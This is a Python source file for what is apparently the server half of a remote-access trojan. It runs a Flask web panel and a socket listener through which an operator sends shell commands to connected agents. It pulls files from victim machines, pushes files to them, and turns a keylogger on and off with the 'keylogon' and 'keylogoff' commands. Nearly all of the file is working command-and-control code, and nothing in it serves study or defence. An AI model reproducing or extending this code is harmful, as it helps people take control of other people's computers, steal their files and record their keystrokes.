# import socket
# from subprocess import run

# def run_command(command):
#     x= run(command,shell=True,text=True,capture_C_OUTPUT=True)
#     return (str(x.stdout+x.stderr).strip()) 


#SERVER
from flask import *
import os
import socket 
import threading,time
import pybase64

thread_index=0
global rec
rec=''
THREADS = []
C_INPUT = []
C_OUTPUT = []
IPS = []
Setup = False

for i in range(20):
    # THREADS.append('')
    C_INPUT.append('')
    C_OUTPUT.append('')
    IPS.append('')


HOST = socket.gethostname()
HOST_IP= "192.168.1.53"
PORT = 8003
BUFFER = 2024 
msg=''
test=''
status="" 
app=Flask(__name__)


def handle_conn(conn,addr,thread_index):
    global C_INPUT
    global C_OUTPUT
    global msg


    while C_INPUT[thread_index]!='quit':
       msg=conn.recv(1024).decode()
       C_OUTPUT[thread_index]=msg
       while True:
        if C_INPUT[thread_index]!='':
            
            print(msg)
            if C_INPUT[thread_index].split(" ")[0]=="lele":
                
                cmd=C_INPUT[thread_index]
                file_name=C_INPUT[thread_index].split(" ")[1]
                conn.send(cmd.encode())
                contents=conn.recv(2048).decode()
                rec=contents
                file_path = 'transfers//' + file_name
                f = open(file_path, 'wb')
                f.write(contents.encode())
                f.close()
                C_INPUT[thread_index]=''
                C_OUTPUT[thread_index]="Done fetching"
            
            elif C_INPUT[thread_index].split(" ")[0]=="dede":
                file_name=C_INPUT[thread_index].split(" ")[1]
                file_path = 'transfers/' + file_name
                f=open(file_path,'r')
                contents=f.read()
                f.close()
                conn.send(contents.encode("utf-8"))
                C_INPUT[thread_index]=''
                C_OUTPUT[thread_index]="Done sending"
            elif C_INPUT[thread_index].split(" ")[0]=="keylogon":
                cmd=C_INPUT[thread_index]
                conn.send(cmd.encode())
                msg=conn.recv(2048).decode()
                C_OUTPUT[thread_index]=msg
                C_INPUT[thread_index]=''

            elif C_INPUT[thread_index].split(" ")[0]=="keylogoff":
                cmd=C_INPUT[thread_index]
                conn.send(cmd.encode())
                msg=conn.recv(2048).decode()
                C_OUTPUT[thread_index]=msg
                C_INPUT[thread_index]=''



                
            else:
                
                msg=C_INPUT[thread_index]
                conn.send(msg.encode())
                C_INPUT[thread_index]=''
                break
            
    
   



def close_conn(conn,thread_index):
    print("[-]--closing server--[-]")
    conn.close()   
    THREADS[thread_index]=''
    IPS[thread_index]=''
    C_INPUT[thread_index]=''
    C_OUTPUT[thread_index]=''
    

        


def _server():
# def init_server(): 
      
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((HOST_IP, PORT))
        server_sock.listen(5) 
        global THREADS
        global IPS
        print(f"Server started at {HOST_IP}") 
       
        while True:
            conn, addr = server_sock.accept() 
            thread_index=len(THREADS)
            t=threading.Thread(target=handle_conn,args=(conn,addr,len(THREADS)))
            THREADS.append(t)
            IPS.append(addr)

          
            t.start()
        close_conn(conn)

 
def init_server():
     s1=threading.Thread(target=_server)
     s1.start()


def start_server():
    global Setup
    if not Setup:
        print("--{Setting up Server!}--")
        init_server()
        Setup = True



     


@app.route("/home")
def home():
    
    return render_template("index.html",threads=THREADS,ips=IPS)

# @app.route("/agents")

# def agents():
#     return render_template("agents.html",threads=THREADS,ips=IPS)


@app.route("/<agentname>/command",methods=['GET','POST'])
def command(agentname):
    cmd_out=''
    if request.method=='POST':
        cmd=request.form['command']
        for i in THREADS:
            if agentname in i.name:
                req_index=THREADS.index(i)

        C_INPUT[req_index]=cmd
        time.sleep(1)
        
        cmd_out=C_OUTPUT[req_index]
        print("data--->"+cmd_out)
        print("File->cONTETN===> "+rec)
       
       
    return render_template("com.html",name=agentname,cm_out=cmd_out)


if __name__ == '__main__':
    start_server()
    app.run(port=8000, debug=True)

